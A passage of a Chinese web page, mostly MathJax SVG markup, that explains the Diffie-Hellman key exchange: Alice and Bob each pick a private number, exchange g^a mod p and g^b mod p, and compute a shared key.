-134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mi" transform="translate(3017.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3895.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4380.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(4900.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>，并将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container>发送给Bob</li><li>Bob选择一个随机数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>（私钥）并计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="12.086ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 5341.9 1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(1036.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2092.6,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mi" transform="translate(2955.9,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3833.9,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4318.9,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(4838.9,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>，并将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container>发送给Alice</li><li>Alice计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="14.488ex" height="2.084ex" role="img" focusable="false" viewBox="0 -716 6403.6 921"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(521,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(987,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1754.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2810.6,0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(783,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mi" transform="translate(4017.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4895.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5380.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(5900.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container></li><li>Bob计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="14.348ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 6341.9 1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(521,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(987,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1754.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2810.6,0)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mi" transform="translate(792,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mi" transform="translate(3955.9,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4833.9,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5318.9,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(5838.9,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container></li><li>Alice和Bob就同时协商出群元素<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="2.8ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 1237.4 